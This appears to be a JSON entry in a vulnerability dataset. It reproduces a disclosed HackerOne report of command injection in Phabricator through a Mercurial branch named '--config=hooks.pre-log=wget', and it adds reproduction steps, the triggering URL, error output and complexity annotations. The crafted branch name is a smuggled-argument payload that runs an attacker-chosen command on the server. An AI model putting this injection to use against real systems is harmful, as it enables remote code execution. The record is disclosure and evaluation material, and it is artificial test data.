@@ -1,0 +1,53 @@
+{
+  "reported_to": "Phabricator",
+  "reported_by": "pnig0s ",
+  "title": "Command injection on Phabricator instance with an evil hg branch name",
+  "content": "\nHi phabricator,\nI found an evil branch name of hg a repo can lead to arbitrary command injection on phabricator instance.\nHere is the reproduction steps:\nMonitor a remote mercurial repo with phabricator;\nCreate a branch and called \"--config=hooks.pre-log=wget\" on the remote;\nAfter phabricator update the remote repo,visit the history page of that crafted branch;\nCode 77 Bytes\n1http://instanceip/source/hgclone/history/--config%253Dhooks.pre-log%253Dwget/\nIt will raise an error like below and the wget command will be executed;\nI test this issue both on my own server instance and the cloud instance with mercurial 4.4(latest) installed(on my server).\nCode 598 Bytes\n1Command failed with error #255! COMMAND hg --config ui.ssh='/data/phabricator/phabricator/bin/ssh-\n2connect' log --debug --template '{node};{parents}\\n' --limit 101 -b '--config=hooks.pre-log=wget' --rev \n3'reverse(ancestors('\\''84e8c5feb4faba2f1b230575e747c3bffe7c7a3c'\\''))' STDOUT running hook pre-log: \n4wget STDERR not trusting file /var/repo/3/.hg/hgrc from untrusted user root, group root not trusting file \n5/var/repo/3/.hg/hgrc from untrusted user root, group root wget: missing URL Usage: wget [OPTION]... \n6[URL]... Try `wget --help' for more options. abort: pre-log hook exited with status 1\nThe root cause is that the branch name inject to the hg command directly and that define a hook will run before the hg log command been executed.\nThanks!\n\n",
+  "severity": [
+    9.9,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1510378920,
+  "report_url": "https://hackerone.com/reports/288704",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Monitor a remote Mercurial repo with Phabricator"
+    ],
+    [
+      2,
+      "Create a branch named '--config=hooks.pre-log=wget' on the remote repo"
+    ],
+    [
+      3,
+      "Wait for Phabricator to update the remote repo"
+    ],
+    [
+      4,
+      "Visit the history page of the crafted branch: http://instanceip/source/hgclone/history/--config%253Dhooks.pre-log%253Dwget/"
+    ]
+  ],
+  "vuln_description": "A command injection vulnerability in Phabricator allows an attacker to execute arbitrary commands by creating a maliciously named Mercurial branch. The branch name is injected directly into the 'hg' command, defining a hook that runs before the 'hg log' command is executed.",
+  "reason": "The vulnerability requires understanding of Mercurial branch naming conventions and hook configurations, as well as how Phabricator processes remote repositories. The interaction between the branch name and command execution is non-obvious but doesn't involve multiple complex components or state manipulation.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves command injection via a crafted branch name in a Mercurial repository monitored by Phabricator. The detection methodology described focuses on authentication and authorization issues (IDOR, AuthN/AuthZ bypass) by swapping user sessions and resource IDs within the same application. However, this vulnerability is a command injection issue, which is a different class of vulnerability not covered by the described methodology. The methodology does not account for malicious input (like branch names) leading to command injection.",
+    "is_detectable": false
+  }
+}
